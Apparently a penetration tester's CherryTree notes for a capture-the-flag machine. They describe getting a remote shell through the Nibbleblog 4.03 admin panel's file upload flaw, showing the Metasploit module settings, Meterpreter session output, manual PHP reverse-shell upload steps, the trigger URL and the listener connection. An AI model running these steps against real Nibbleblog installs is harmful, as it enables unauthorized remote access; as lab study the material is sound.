<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Get a shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Nibbleblog</h1></strong><h1> - </h1><strong><h1>Admin Panel - Get a shell</h1></strong><br />I&#39;ve only tested this on Version 4.03, which has a file upload vulnerability.<br />Not sure if it works on other versions.<br /><br />YOU NEED CREDENTIALS/ACCESS TO THE ADMIN PANEL ALSO.<br /><br />You can use a metasploit module - <code>exploit/multi/http/nibbleblog_file_upload</code><br /> - or upload a file manually. Both are pretty trivial.<br /><br /><strong><h2>## Metasploit Module</h2></strong><br />There&#39;s a Metasploit module which will upload a file and get you a shell<br /><code>exploit/multi/http/nibbleblog_file_upload</code><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/nibbles#&nbsp;msfconsole&nbsp;-q<br />[...]<br />msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/http/nibbleblog_file_upload<br />msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;PASSWORD&nbsp;nibbles<br />msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.75<br />msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;TARGETURI&nbsp;/nibbleblog/<br />msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;USERNAME&nbsp;admin<br />msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;exploit<br />[*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.6:4444&nbsp;<br />[*]&nbsp;Sending&nbsp;stage&nbsp;(38247&nbsp;bytes)&nbsp;to&nbsp;10.10.10.75<br />[*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.6:4444&nbsp;-&gt;&nbsp;10.10.10.75:56256)&nbsp;at&nbsp;2019-09-17&nbsp;18:18:19&nbsp;+0100<br />[+]&nbsp;Deleted&nbsp;image.php<br /><br />meterpreter&nbsp;&gt;&nbsp;sysinfo<br />Computer&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Nibbles<br />OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Linux&nbsp;Nibbles&nbsp;4.4.0-104-generic&nbsp;#127-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Dec&nbsp;11&nbsp;12:16:42&nbsp;UTC&nbsp;2017&nbsp;x86_64<br />Meterpreter&nbsp;:&nbsp;php/linux</div></div><br /><br /><strong><h2>## Manually upload shell</h2></strong><br />On the admin panel, go to <code>Plugins &gt; My image &gt; Configure</code><br />You&#39;re at a file upload form.<br /><a href=""><img src="images/249-1.png" alt="images/249-1.png" /></a><br /><br />Prep a PHP reverse shell file, start a listener, and upload your PHP reverse shell.<br />Ignore the errors, they don&#39;t matter.<br /><br />To activate the shell, visit:<br /><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</code><br /><br />The page should load and you should have a shell on your listener!<br /><div class="codebox"><div class="codebox">listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br />connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.75]&nbsp;43102<br />Linux&nbsp;Nibbles&nbsp;4.4.0-104-generic&nbsp;#127-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Dec&nbsp;11&nbsp;12:16:42&nbsp;UTC&nbsp;2017&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux<br />&nbsp;05:57:55&nbsp;up&nbsp;40&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br />USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br />uid=1001(nibbler)&nbsp;gid=1001(nibbler)&nbsp;groups=1001(nibbler)<br />/bin/sh:&nbsp;0:&nbsp;can&#39;t&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br />$&nbsp;</div></div><br /><br /></div>
</body>
</html>
